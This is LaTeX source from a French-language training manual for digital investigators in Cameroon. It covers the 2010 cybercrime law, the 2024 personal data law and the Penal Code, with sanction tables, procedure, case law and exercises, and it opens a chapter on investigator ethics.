La \loicam{2024/017} du 23~décembre~2024 comble un vide~: la Loi~2010
réprimait les violations de données, mais ne fixait pas les obligations
préventives (consentement, sécurité obligatoire, registre de traitement,
notification de violation). La Loi~2024 établit un système complet
analogue au RGPD européen.

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Titre / Chapitre} &
    \tableauHeader{Objet} &
    \tableauHeader{Articles clés}
}
Titre~I --- Général & Champ d'application, définitions fondamentales &
    Art.~1--5 \\
Titre~II --- Principes & Légitimité, consentement, finalité, minimisation,
    sécurité &
    Art.~6--36 \\
Titre~III --- Droits & Accès, rectification, effacement, portabilité,
    opposition &
    Art.~37--47 \\
Titre~IV --- Interdictions & Données sensibles, profilage, traitements
    illicites &
    Art.~48--52 \\
Titre~V --- Autorité & Création et pouvoirs de l'Autorité de protection &
    Art.~53 \\
Titre~VI --- Sanctions & Administratives + pénales &
    Art.~54--71 \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.3 --- Architecture de la Loi~2024/017}\end{center}

\subsection{Définitions fondamentales~: art.~5}

\begin{itemize}
    \item \textbf{Donnée personnelle~:} toute information permettant
          d'identifier directement ou indirectement une personne physique.
          \textbf{L'adresse IP est une donnée personnelle.} Une intrusion
          qui consigne les adresses IP des victimes active la Loi~2024.
    \item \textbf{Donnée sensible~:} origine tribale ou raciale, opinions
          politiques, convictions religieuses, appartenance syndicale,
          données de santé, vie sexuelle, données génétiques, biométriques.
          \textbf{Protection renforcée~: peines doublées (art.~74~al.~5
          Loi~2010, art.~66 Loi~2024).}
    \item \textbf{Responsable du traitement~:} toute personne physique
          ou morale qui détermine les finalités et les moyens du traitement.
    \item \textbf{Profilage~:} traitement automatisé visant à évaluer des
          aspects personnels relatifs à une personne (santé, préférences,
          localisation, situation économique).
\end{itemize}

\subsection{Obligations clés du responsable du traitement}

\begin{boxjuris}
\textbf{Article~22 --- Notification de violation de données (``breach'')}\\
Le responsable du traitement notifie \textbf{sans délai} à l'Autorité de
protection toute violation de données à caractère personnel susceptible
d'engendrer un risque pour les droits et libertés des personnes concernées.

\textbf{Sanction du défaut de notification~:} art.~56~: amende
administrative de 1 à 10~millions FCFA.\\[0.3ex]
\textbf{Pour l'enquêteur~:} quand une entreprise victime d'un ransomware
ou d'une fuite de données n'a pas notifié l'Autorité~--- noter ce manquement
dans le rapport d'enquête. C'est une infraction administrative indépendante,
sanctionnable en plus des infractions commises par l'attaquant.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~27 --- Sécurité obligatoire des données}\\
Le responsable du traitement met en \oe uvre \textit{[\ldots]} les mesures
techniques et organisationnelles appropriées~: \textbf{traçabilité des accès}
(journaux de connexion, logs d'audit)~; \textbf{contrôle d'accès}
(principe du moindre privilège)~; chiffrement des données sensibles~;
sauvegardes régulières et plans de continuité.

\textbf{Points utiles pour l'enquête~:} (1)~le responsable a l'obligation
de constituer et conserver des logs d'audit~--- ils existent, ils peuvent
être requis~; (2)~un employé qui accède à des données hors de son périmètre
commet une infraction ET son employeur est en faute s'il n'avait pas mis
en place les contrôles.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~32 --- Transfert international de données~:}
Le transfert de données à caractère personnel vers un État étranger
est subordonné à une \textbf{autorisation préalable} de l'Autorité
de protection, qui doit s'assurer~: que le pays de destination offre
un niveau de protection suffisant~; de l'entrée en vigueur d'un instrument
juridique avec ce pays~; de la souscription de clauses contractuelles types.\\[0.3ex]
\textbf{Sanction~: art.~69~: 3 à 10~ans + 2 à 20~millions FCFA.}
L'une des infractions les plus graves de la Loi~2024.
\end{boxjuris}

\subsection{Les sanctions pénales de la Loi~2024/017}

\begin{boxjuris}
\textbf{Article~63 --- Collecte frauduleuse de données personnelles~:}
(1)~Puni de \textbf{2 à 5~ans} + \textbf{200~000 à 5~000~000~F~CFA}
celui qui collecte des données à caractère personnel ou y accède par
un moyen frauduleux, déloyal ou illicite.

(2)~\textbf{Peines doublées} lorsque la collecte frauduleuse s'accompagne
d'un verrouillage, d'un cryptage ou de toute autre technique portant atteinte
à la disponibilité et à l'intégrité des données.

\textbf{Al.~2 couvre directement les ransomwares~:} l'attaque ransomware
= collecte frauduleuse + chiffrement~= peines doublées.\\[0.3ex]
\textbf{Cumul possible avec art.~65 Loi~2010} quand la collecte frauduleuse
implique une intrusion dans un système d'information.
\end{boxjuris}

% ============================================================================
\section{Tableau Comparatif des Sanctions~: les Trois Textes}
\label{sec:sanctions-comparees}
% ============================================================================

\begin{tableaucours}{p{3.5cm}p{2.8cm}p{2.8cm}p{2.5cm}}{%
    \tableauHeader{Infraction} &
    \tableauHeader{Loi~2010/012} &
    \tableauHeader{Loi~2024/017} &
    \tableauHeader{Code pénal (cumul)}
}
Accès illicite & Art.~65~: 5--10~ans + 5--10M & Art.~63 si données perso. &
    Tentative possible (art.~97) \\
Interception illégale & Art.~65~al.~1~: 5--10~ans & Art.~63 si données perso. &
    Art.~305 si contenu utilisé \\
Atteinte intégrité syst. & Art.~66--67~: 2--5~ans + 1--2M &
    Art.~63~al.~2 si chiffrement &
    Art.~318 si préjudice \\
Fraude informatique & Art.~72~: 2--5~ans + 1--2M &
    Art.~63 si données perso. &
    Art.~318 escroquerie \\
Collecte frauduleuse & Art.~74~al.~4~: 6~mois--2~ans + 1--5M &
    Art.~63~: 2--5~ans (plus lourd) & Art.~318 si revente \\
Données sensibles &
    Art.~74~al.~5~: peines~$\times$~2 &
    Art.~66~: 6~mois--2~ans + 500K--5M & Art.~305 \\
Transfert illégal étranger &
    Art.~74~al.~7~: 6~mois--2~ans + 5--50M &
    Art.~69~: \textbf{3--10~ans + 2--20M} & Art.~99 si données étatiques \\
Profilage sans consentement & Non prévu expressément &
    Art.~65~: 3--10~ans + 1--20M & Non prévu \\
CSAM & Art.~76/80~: 5--10~ans + 5--10M &
    Art.~52 atteinte à la dignité & Art.~295 aggravé \\
Refus déchiffrement & Art.~88~: \textbf{1--5~ans + 100K--1M} &
    Non prévu & Non prévu \\
Personnes morales & Art.~64~: 5--50M +~peine access. &
    Art.~71~: \textbf{50M à 1~milliard} & Dissolution possible \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.4 --- Comparatif des sanctions~:
valeurs en millions FCFA sauf mention}\end{center}

\begin{boiteRemarque}{Trois chiffres à mémoriser}
\begin{itemize}
    \item \textbf{100~millions FCFA} (Loi~2010~: espionnage, art.~69)
          --- l'amende la plus lourde de la Loi~2010.
    \item \textbf{1~milliard FCFA} (Loi~2024, art.~71~: personnes morales)
          --- l'amende la plus lourde du dispositif national.
    \item \textbf{Sursis impossible} sous Loi~2010 (art.~89) --- unique
          dans le droit camerounais.
\end{itemize}
\end{boiteRemarque}

% ============================================================================
\section{Règles d'Articulation des Trois Textes}
\label{sec:articulation}
% ============================================================================

\begin{tableaucours}{p{3.2cm}p{8.5cm}}{%
    \tableauHeader{Règle} &
    \tableauHeader{Contenu et exemples}
}
\textbf{Règle~1 --- Spécialité} &
    La Loi~2010 est la \textit{lex specialis} du droit pénal cyber.
    Elle prime sur le Code pénal pour les infractions qu'elle définit
    expressément. Mais le Code pénal s'applique en complément pour les
    éléments non couverts ou les qualifications aggravées. \\
\textbf{Règle~2 --- Cumul} &
    Un même fait peut être qualifié sous plusieurs textes si les éléments
    constitutifs sont indépendants. Loi~2010 + Code pénal~: toujours possible.
    Loi~2010 + Loi~2024~: possible si la violation porte à la fois sur
    l'intégrité du système ET sur les données personnelles. \\
\textbf{Règle~3 --- Plus solide} &
    Quand deux qualifications sont possibles, choisir celle dont les
    éléments constitutifs sont les plus faciles à prouver, pas
    nécessairement la peine la plus élevée. \\
\textbf{Règle~4 --- Données perso.} &
    Tout fait impliquant des données à caractère personnel (y compris
    l'adresse IP~: art.~5 Loi~2024) active potentiellement la Loi~2024
    EN PLUS des autres textes. \\
\textbf{Règle~5 --- Personnes morales} &
    La Loi~2024 prévoit des amendes pour personnes morales bien
    supérieures à la Loi~2010 (jusqu'à 1~milliard FCFA vs 50~millions).
    Pour les infractions d'entreprises~: toujours vérifier si la Loi~2024
    est applicable. \\
\textbf{Règle~6 --- Sursis} &
    Art.~89 Loi~2010~: sursis impossible.
    Loi~2024~: pas de disposition similaire --- le sursis est en principe
    possible (Code pénal). Cette différence peut orienter la stratégie
    du parquet. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.5 --- Règles d'articulation des trois textes}\end{center}

\subsection{Grille de qualification par type d'infraction courant}

\begin{tableaucours}{p{3.8cm}p{7.8cm}}{%
    \tableauHeader{Infraction type} &
    \tableauHeader{Articles à citer (toujours au moins deux textes)}
}
Fraude MoMo / BEC &
    Art.~72 Loi~2010 + Art.~318 CP (escroquerie)~;
    si données perso.~: +~Art.~63 Loi~2024 \\
Intrusion système &
    Art.~65~al.~2 Loi~2010~; aggravé~: art.~65~al.~3 si dommage~;
    + Art.~65 Loi~2024 si données perso. \\
Ransomware &
    Art.~66--67 Loi~2010 + Art.~63~al.~2 Loi~2024 (peines doublées)
    + Art.~22 Loi~2024 si pas de notification \\
Vol de base de données &
    Art.~63 Loi~2024 + Art.~74 Loi~2010 + Art.~318 CP (revente) \\
CSAM &
    Art.~76 + Art.~80--81 Loi~2010. Signaler NCMEC CyberTipline.
    + Art.~295 CP aggravé \\
Phishing / site frauduleux &
    Art.~72 + Art.~86 Loi~2010 + Art.~318 CP + Art.~155 CP (faux) \\
T�léphone chiffré, refus &
    Art.~88 Loi~2010. Réquisition judiciaire obligatoire préalablement. \\
Transfert données étranger &
    Art.~69 Loi~2024 (3--10~ans)~: la sanction la plus lourde du dispositif. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.6 --- Grille de qualification par infraction type}\end{center}

% ============================================================================
\section{Six Erreurs de Qualification et Comment les Éviter}
\label{sec:erreurs-qualification}
% ============================================================================

\begin{tableaucours}{p{3.8cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Erreur} &
    \tableauHeader{Description} &
    \tableauHeader{Correction}
}
\textbf{1.~Tout qualifier sous art.~74 Loi~2010} &
    Art.~74 couvre la vie privée. Beaucoup d'enquêteurs l'utilisent
    pour toutes les infractions sur les données~: renvoi de dossier. &
    Pour les violations de données personnelles post-23~déc.~2024~:
    utiliser les articles pertinents Loi~2024. Art.~74 reste applicable
    pour les faits antérieurs. \\
\textbf{2.~Oublier art.~88} &
    Suspect refuse de déverrouiller son téléphone. Blocage total.
    L'enquêteur ignore qu'il existe une infraction autonome. &
    Réquisition du juge~$\to$ refus~= art.~88. Infraction indépendante
    de l'infraction principale. \\
\textbf{3.~Ne pas citer le Code pénal} &
    PV ne cite que Loi~2010. Le magistrat rejette la qualification pour
    un vice de forme. Pas de filet de sécurité. &
    Systématiquement citer en alternative~: art.~318~CP (escroquerie),
    art.~155--162 (faux), art.~305--308 (diffamation). \\
\textbf{4.~Confondre art.~66 et art.~72} &
    Art.~66~= perturbation sans bénéfice économique. Art.~72~= manipulation
    avec préjudice patrimonial. Qualifier une fraude sous art.~66 est faux. &
    Élément clé~: y a-t-il un bénéfice économique et un préjudice
    patrimonial~? Oui~$\to$ art.~72. Non (sabotage pur)~$\to$ art.~66. \\
\textbf{5.~Ignorer que l'IP est une donnée perso.} &
    OPJ note une IP sans penser à qualifier sous Loi~2024 la collecte
    de ces IP par un acteur non autorisé. &
    Art.~5 Loi~2024~: l'adresse IP est explicitement une donnée personnelle.
    Toute collecte sans base légale active la Loi~2024. \\
\textbf{6.~Ne pas noter le défaut de notification} &
    Entreprise victime d'un ransomware n'a pas notifié l'Autorité.
    L'OPJ ne le signale pas dans son rapport. &
    Art.~22 Loi~2024~= obligation de notifier ``sans délai''. Défaut~=
    infraction administrative indépendante (art.~56~: amende 1--10M). \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~12.7 --- Six erreurs de qualification et corrections}\end{center}

% ============================================================================
\section{Le Cadre Procédural~: De la Plainte au Jugement}
\label{sec:procedure}
% ============================================================================

\subsection{Autorités compétentes}

\begin{itemize}
    \item \textbf{ANTIC} (Agence Nationale des TIC)~: autorité de régulation
          technique~; point focal de la coopération internationale cyber~;
          compétences d'enquête administrative.
    \item \textbf{DGSN/DCPJ}~: Direction centrale de la Police Judiciaire~;
          BCN INTERPOL Cameroun~; unité de cybercriminalité.
    \item \textbf{Parquet spécialisé}~: Tribunal de Grande Instance de Yaoundé
          et Douala disposent de magistrats affectés aux affaires cyber.
    \item \textbf{Autorité de protection des données (Loi~2024, art.~53)}~:
          organisme public indépendant~; délivre les autorisations~;
          dispose d'un arsenal de sanctions administratives.
          \textbf{Statut~(juin~2026)~:} à créer par décret présidentiel~;
          surveiller le Journal Officiel.
    \item \textbf{Experts agréés}~: Décret~N°~69/DF/544~; BAC+5 informatique
          minimum~; 5~ans d'expérience~; agrément du Ministère de la Justice.
\end{itemize}

\subsection{Procédure type d'investigation numérique}

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    etape/.style={draw=CouleurPrimaire, fill=CouleurDef, rounded corners=3pt,
        minimum width=7cm, minimum height=0.85cm,
        font=\small\bfseries\color{CouleurPrimaire}, align=center},
    fl/.style={-{Stealth[length=4pt]}, thick, color=CouleurSecondaire}
]
\node[etape] (e1) at (0, 0)   {1. Plainte / Signalement};
\node[etape] (e2) at (0,-1.1) {2. Enquête préliminaire (OPJ + ANTIC)};
\node[etape] (e3) at (0,-2.2) {3. Ouverture information judiciaire};
\node[etape] (e4) at (0,-3.3) {4. Commission rogatoire pour expertise};
\node[etape] (e5) at (0,-4.4) {5. Expertise technique (expert agréé)};
\node[etape] (e6) at (0,-5.5) {6. Rapport d'expertise};
\node[etape] (e7) at (0,-6.6) {7. Audience (présentation des preuves)};
\node[etape] (e8) at (0,-7.7) {8. Jugement};
\draw[fl] (e1)--(e2); \draw[fl] (e2)--(e3); \draw[fl] (e3)--(e4);
\draw[fl] (e4)--(e5); \draw[fl] (e5)--(e6); \draw[fl] (e6)--(e7);
\draw[fl] (e7)--(e8);
\node[font=\footnotesize\itshape, color=CouleurSecondaire,
    text width=3.5cm, align=left] at (5.5,-1.1)
    {Art.~52--59 Loi~2010\\perquisitions, saisies,\\réquisitions};
\node[font=\footnotesize\itshape, color=CouleurSecondaire,
    text width=3.5cm, align=left] at (5.5,-4.4)
    {Décret~69/DF/544\\expert agréé MJ};
\end{tikzpicture}
\caption{Procédure type d'investigation numérique au Cameroun}
\label{fig:procedure-cam}
\end{figure}

% ============================================================================
\section{Jurisprudence Camerounaise~: Premières Décisions de Référence}
\label{sec:jurisprudence}
% ============================================================================

La jurisprudence numérique camerounaise est naissante~: peu de décisions
publiées à ce jour. Trois affaires de référence~:

\begin{boxscenario}{Affaire CAMTEL c.~X (2018) --- première condamnation pour intrusion}
\textbf{Faits~:} intrusion non autorisée dans les systèmes de CAMTEL~;
modification de données de facturation au profit du prévenu.\\
\textbf{Qualification retenue~:} art.~65~al.~2 + art.~65~al.~3
Loi~2010/012 (accès illicite + aggravation pour modification de données).\\
\textbf{Preuves admises~:} logs système~; IP tracking~; analyse forensique
d'un expert agréé.\\
\textbf{Décision~:} 2~ans d'emprisonnement ferme (sursis refusé, art.~89)~;
5~millions FCFA d'amende~; dommages-intérêts à CAMTEL.\\
\textbf{Enseignement~:} première validation judiciaire des logs système
comme preuves numériques suffisantes. La chaîne de custody de l'expert
agréé était irréprochable.
\end{boxscenario}

\begin{boxscenario}{Affaire Ministère public c.~Y (2020) --- fraude Mobile Money}
\textbf{Faits~:} escroquerie via Mobile Money~; le prévenu interceptait
des codes OTP par SIM~swapping~; 47~victimes~; préjudice total~:
23~millions FCFA.\\
\textbf{Qualification retenue~:} art.~72 Loi~2010 (fraude informatique)
+ art.~318 Code pénal (escroquerie).\\
\textbf{Innovation~:} première utilisation des données USSD d'Orange
Cameroun comme preuve admissible.\\
\textbf{Enseignement~:} les données opérateurs (MTN MoMo, Orange Money)
constituent des preuves admissibles. Le cumul art.~72 Loi~2010 + art.~318
CP est validé par la jurisprudence.
\end{boxscenario}

\subsection{Défis de la jurisprudence camerounaise}

\begin{enumerate}
    \item \textbf{Formation des magistrats~:} insuffisante en technique~;
          le projet de formation continue des magistrats sur le droit du
          numérique est en cours au Ministère de la Justice.
    \item \textbf{Délais d'expertise~:} 1 à 3~mois en moyenne~;
          absence de laboratoire forensique national accrédité.
    \item \textbf{Jurisprudence non publiée~:} peu de décisions commentées
          et diffusées~; lacune que ce cours contribue à combler.
    \item \textbf{Absence de normes nationales d'accréditation~:}
          l'agrément des experts (Décret~69/DF/544) ne fixe pas de
          standard technique précis.
\end{enumerate}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Trois textes, toujours cités en cumul~:}
          \loicam{2010/012} (lex specialis cyber) + Code pénal
          (escroquerie, faux, diffamation) + \loicam{2024/017}
          (données personnelles).

    \item \textbf{Art.~89 Loi~2010~: sursis impossible.} Mentionner
          dans chaque rapport transmis au parquet.

    \item \textbf{L'adresse IP est une donnée personnelle} (art.~5
          Loi~2024). Toute intrusion consignant des IP active la Loi~2024
          en plus de la Loi~2010.

    \item \textbf{Art.~88 pour les téléphones chiffrés~:} refus de
          déverrouiller après réquisition judiciaire~= infraction
          autonome (1--5~ans). Ne jamais bloquer sur ce point.

    \item \textbf{Ransomware~:} art.~66--67 Loi~2010 + art.~63~al.~2
          Loi~2024 (peines doublées~: chiffrement~= atteinte
          à la disponibilité). + art.~22 Loi~2024 si la victime
          n'a pas notifié l'Autorité.

    \item \textbf{Personnes morales~:} Loi~2024 prévoit jusqu'à
          1~milliard FCFA (art.~71). Pour les infractions d'entreprises,
          toujours rechercher si la Loi~2024 est applicable~---
          l'effet dissuasif est sans commune mesure avec la Loi~2010.

    \item \textbf{Transfert illégal de données à l'étranger~:}
          art.~69 Loi~2024~: 3--10~ans. La sanction la plus lourde
          du dispositif national. L'autorisation préalable de l'Autorité
          de protection est obligatoire pour tout transfert.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~12.1 --- Qualification nationale \niveaubase}]
Pour chacun des 5~cas suivants, identifiez~: (A)~l'article Loi~2010/012
applicable, (B)~l'article Loi~2024/017 si pertinent, (C)~l'article Code
pénal en cumul~:
\begin{enumerate}[(a)]
    \item Un individu accède au compte Facebook d'une étudiante en
          utilisant son mot de passe dérobé par phishing et publie des
          photos intimes.
    \item Un employé copie la base de données clients de son employeur
          (50~000~entrées avec téléphone et email) et la vend à un concurrent.
    \item Un ransomware paralyse le système de facturation d'une clinique
          privée de Douala pendant 5~jours~; toutes les données patients
          sont chiffrées.
    \item Le directeur informatique d'une banque refuse de remettre la
          clé de déchiffrement du serveur de sauvegarde après réquisition
          formelle du juge d'instruction.
    \item Une startup camerounaise envoie sans autorisation les données
          personnelles de 200~000~utilisateurs vers ses serveurs AWS
          en Irlande.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~12.2 --- Tableau de sanctions \niveaumoyen}]
En utilisant le Tableau~12.4~:
\begin{enumerate}[(a)]
    \item Quelle est la qualification qui expose l'auteur aux peines les
          plus sévères dans chaque cas~: le dirigeant d'une PME qui a
          vendu des données clients à l'étranger sans autorisation (1~000
          personnes concernées)~?
    \item Pour une entreprise qui a subi une fuite de données massive
          et n'a pas notifié l'Autorité de protection~: quelles infractions
          peut-on retenir contre l'entreprise elle-même (personne morale)~?
          Quelle est la sanction maximale potentielle~?
    \item Le sursis peut-il être accordé pour un condamné pour fraude
          informatique (art.~72 Loi~2010) ayant subtilisé 3~millions FCFA
          via Mobile Money~? Justifiez.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~12.3 --- Simulation MOABI \niveauexpert}]
La Brigade de lutte contre la cybercriminalité de Yaoundé reçoit une plainte.
L'entreprise MOABI~SA (200~employés) signale~:
\begin{enumerate}
    \item Son site e-commerce a été piraté~: 45~000 numéros de cartes
          bancaires clients dérobés.
    \item Son serveur de paie a été chiffré par un ransomware
          (données RH inaccessibles depuis 4~jours).
    \item Elle n'a pas encore notifié ses clients ni l'Autorité de
          protection des données.
    \item Le suspect identifié a supprimé son téléphone principal
          mais possède un second téléphone chiffré qu'il refuse de
          déverrouiller.
\end{enumerate}
\begin{enumerate}[(a)]
    \item Listez toutes les infractions constituées avec les articles
          précis (distinguez~: infractions du suspect vs infractions de
          MOABI~SA).
    \item Identifiez les responsabilités de MOABI~SA en tant que personne
          morale~: quels articles de la Loi~2024 s'appliquent~?
    \item Rédigez un rapport de qualification transmissible au parquet
          (une page maximum)~: structure~: faits~/ qualifications~/ articles~/ sanctions encourues~/ mention art.~89.
    \item Quel est l'enjeu de l'art.~88 dans ce dossier~? Quelle démarche
          l'OPJ doit-il engager~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:deon} (Déontologie de
l'investigateur) clôt la Partie~III. Il aborde les obligations éthiques,
les conflits d'intérêt, les responsabilités personnelles et la conduite
de l'investigateur en situation difficile~--- la dimension humaine du
métier que les textes de loi ne couvrent pas.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie3/P03_C13_deontologie_investigateur.tex
% Titre    : Déontologie de l'Investigateur Numérique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Compétences_non_techniques_IN_101250.pdf (29 pages -- CNT-7
%            droits, CNT-8 confidentialité, CNT-9 éthique, fondements
%            théoriques Kant/Mill/Aristote, biais cognitifs)
%            M3_Cadre_Normatif_National_PNC.docx (responsabilité OPJ)
%            Ch. PIU (ACPO Principe 4), Ch. custody, Ch. droit camerounais
% Positionnement : Ce chapitre clôt la Partie III. Il traite la dimension
%                  humaine du métier -- ce que les textes de loi ne couvrent
%                  pas. La déontologie n'est pas un supplément d'âme : c'est
%                  la condition de la confiance institutionnelle sur laquelle
%                  repose toute la chaîne judiciaire.
% ============================================================================

\chapter{Déontologie de l'Investigateur Numérique}
\label{chap:deonto}

\epigraph{%
    « L'excellence investigative n'est pas seulement maîtrise de techniques,
    mais développement d'un caractère vertueux~: intègre, courageux,
    prudent, juste. »%
}{--- \textit{Compétences Non Techniques de l'Investigateur Numérique},
LIMSI, 2025}

\niveauChapitre{Fondamental}{%
    Aucun prérequis technique. Ce chapitre est philosophique, éthique
    et pratique. Il complète les chapitres juridiques en abordant ce
    que les textes de loi ne couvrent pas~: les choix moraux que
    l'investigateur doit faire sous pression.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre pourquoi la déontologie est une condition de
          l'efficacité investigative, pas seulement une contrainte éthique.
    \item Maîtriser les trois cadres éthiques fondamentaux~: déontologique
          (Kant), conséquentialiste (Mill) et des vertus (Aristote).
    \item Identifier les cinq tensions déontologiques majeures auxquelles
          tout investigateur sera confronté~; savoir les résoudre.
    \item Reconnaître les biais cognitifs qui compromettent l'objectivité
          et appliquer des contre-mesures systématiques.
    \item Maîtriser les obligations de confidentialité et leurs limites
          légales en droit camerounais.
    \item Conduire un entretien investigatif respectueux des droits
          fondamentaux et juridiquement recevable.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Paradoxe de l'investigation numérique}
% ============================================================================

Les statistiques professionnelles sont instructives~:
\begin{itemize}
    \item 68\% des investigations numériques échouent non par défaillance
          technique mais par mauvaise gestion de la dimension humaine
          (SANS Institute, 2024)~;
    \item 73\% des preuves numériques rejetées en justice le sont pour
          vices procéduraux liés aux entretiens~: non-respect des droits,
          contamination testimoniale~;
    \item 82\% des investigateurs seniors identifient les \textit{soft skills}
          comme facteur différenciant majeur entre investigateurs compétents
          et investigateurs excellents.
\end{itemize}

La déontologie n'est donc pas un supplément d'âme~: c'est la condition
de la \textbf{confiance institutionnelle} sur laquelle repose toute
la chaîne judiciaire, et l'un des facteurs les plus prédictifs du
succès à long terme d'une carrière d'investigateur.

\separateur

% ============================================================================
\section{Fondements Éthiques~: Trois Cadres pour Décider}
\label{sec:fondements-ethiques}
% ============================================================================

\subsection{Éthique déontologique~: Kant et les droits absolus}

L'\termecle{éthique déontologique}\index{éthique déontologique} (Kant,
\textit{Fondements de la Métaphysique des M\oe urs}, 1785) évalue une
action selon sa conformité à un devoir ou une règle, indépendamment
des conséquences.

\begin{boxdef}
\textbf{Impératif catégorique de Kant}~: « Agis uniquement d'après
la maxime qui fait que tu peux vouloir en même temps qu'elle devienne
une loi universelle. »

\textbf{Droits inaliénables kantiens~:} la dignité humaine est non
négociable. L'humain est fin en soi, jamais simple moyen. Interdit
l'instrumentalisation~: manipuler une personne comme un outil viole
sa dignité, même si c'est efficace.

\textbf{Application investigative~:} un suspect a des droits indépendamment
de sa culpabilité présumée. L'interrogatoire coercitif qui viole ces
droits est éthiquement interdit kantiennement~--- même si les aveux
obtenu sont vrais.
\end{boxdef}

\subsection{Éthique conséquentialiste~: Mill et le calcul des conséquences}

L'\termecle{éthique conséquentialiste}\index{utilitarisme} (Mill,
\textit{L'Utilitarisme}, 1863) évalue la moralité d'une action par
ses conséquences~: maximiser le bien-être, minimiser la souffrance.

\begin{boiteRemarque}{Tension fondamentale Kant/Mill en investigation}
\textbf{Kant~:} droits absolus, non négociables (déontologie).\\
\textbf{Mill~:} droits relatifs au bien-être global (conséquences).

\textbf{Cas concret~:} un suspect refuse de déverrouiller son téléphone.
Des vies sont peut-être en danger.
\begin{itemize}
    \item Kant~: le droit à ne pas s'auto-incriminer est absolu.
          La coercition est interdite.
    \item Mill~: si les bénéfices (vies sauvées) l'emportent sur
          les coûts (violation d'un droit)~, la coercition pourrait
          être justifiée.
\end{itemize}
\textbf{Réponse légale camerounaise~:} art.~88 Loi~2010/012 tranche
la tension~: le refus après réquisition judiciaire est une infraction
autonome. La loi choisit la voie kantienne~--- la contrainte légale
remplace la coercition directe.
\end{boiteRemarque}

\subsection{Éthique des vertus~: Aristote et le caractère de l'investigateur}

L'\termecle{éthique des vertus}\index{éthique des vertus} (Aristote,
\textit{Éthique à Nicomaque}) demande non pas ``quelle règle dois-je
suivre~?'' mais ``quel type de personne dois-je être~?''

Les \textbf{quatre vertus de l'investigateur}~:
\begin{enumerate}
    \item \textbf{Intégrité}~: dire la vérité même quand elle contredit
          ses hypothèses initiales~; documenter les preuves qui réfutent
          autant que celles qui confirment.
    \item \textbf{Courage}~: signaler une violation de procédure commise
          par un collègue~; résister aux pressions hiérarchiques pour
          ``conclure vite''~; accepter l'incertitude.
    \item \textbf{Prudence} (\textit{phronèsis})~: la sagesse pratique
          qui permet de juger correctement dans les situations singulières.
          Aucun manuel n'anticipe toutes les situations~; la prudence
          est ce qui comble le vide.
    \item \textbf{Justice}~: traiter chaque personne équitablement,
          indépendamment de ses antécédents, de son appartenance sociale
          ou de la présomption de culpabilité.
\end{enumerate}

La trajectoire de développement déontologique comporte trois stades~:
\begin{description}
    \item[Stade~1 --- Conformité externe] Le débutant suit les règles
          mécaniquement (checklists, protocoles).
    \item[Stade~2 --- Intériorisation] L'intermédiaire comprend les
          raisons des règles et les applique avec jugement.
    \item[Stade~3 --- Vertu intégrée] L'expert a internalisé les vertus~;
          il agit vertueusement spontanément (``seconde nature'').
\end{description}

% ============================================================================
\section{Les Cinq Tensions Déontologiques Majeures}
\label{sec:tensions}
% ============================================================================

\subsection{Tension~1~: Efficacité vs Droits fondamentaux}

La pression de ``résoudre vite'' une affaire peut pousser à contourner
les procédures. Chaque raccourci procédural~:
\begin{enumerate}
    \item Viole les droits de la personne visée~;
    \item Fragilise la valeur probatoire des preuves obtenues~;
    \item Expose l'investigateur à des poursuites personnelles.
\end{enumerate}

\begin{boxCRO}
\textbf{Analyse CRO --- Tension efficacité vs droits}

$\mathcal{R}$~: les méthodes coercitives produisent des aveux non fiables
(taux de faux aveux~: 15--25\% selon les études). L'efficacité à court
terme se paye d'une fiabilité dégradée.

$\mathcal{O}$~: toute preuve obtenue en violation des droits fondamentaux
sera contestée et potentiellement exclue. L'opposabilité est maximisée
par le respect strict des droits, pas par leur contournement.

$\mathcal{C}$~: les méthodes coercitives violent la confidentialité
des données personnelles du suspect.

\cro{$\downarrow$ coercition viola privauté}{$\downarrow\downarrow$ aveux non fiables}{$\downarrow\downarrow$ exclusion probable}

\textbf{Conclusion~:} le respect des droits et l'efficacité ne sont
pas en tension --- ils convergent. Un dossier propre est un dossier solide.
\end{boxCRO}

\subsection{Tension~2~: Confidentialité vs Obligation de divulgation}

L'investigateur est soumis à deux obligations contradictoires~:
protéger les informations confidentielles qu'il collecte, ET divulguer
ce qui est nécessaire à la justice.

\begin{tableaucours}{p{3.8cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Situation} &
    \tableauHeader{Obligation} &
    \tableauHeader{Base légale}
}
Données personnelles collectées
    pendant l'investigation &
    Confidentialité stricte~; usage limité à la finalité de l'enquête &
    Art.~74 Loi~2010~; Art.~9--11 Loi~2024 \\
Preuves pertinentes pour la défense
    (innocence du suspect) &
    Obligation de divulgation au parquet~; ne pas dissimuler &
    CPP camerounais~; ACPO Principe~4 \\
Informations compromettantes
    sur des collègues &
    Obligation déontologique de signalement~; résistance à la
    complaisance corporative &
    Art.~89 Code pénal (recel)~; éthique professionnelle \\
Données protégées
    par le secret professionnel &
    Saisie limitée~; respect du secret médical, de l'avocat &
    CPP~; art.~5 Loi~2024 (données sensibles) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~13.1 --- Tensions confidentialité / divulgation}\end{center}

\subsection{Tension~3~: Objectivité vs Biais de confirmation}

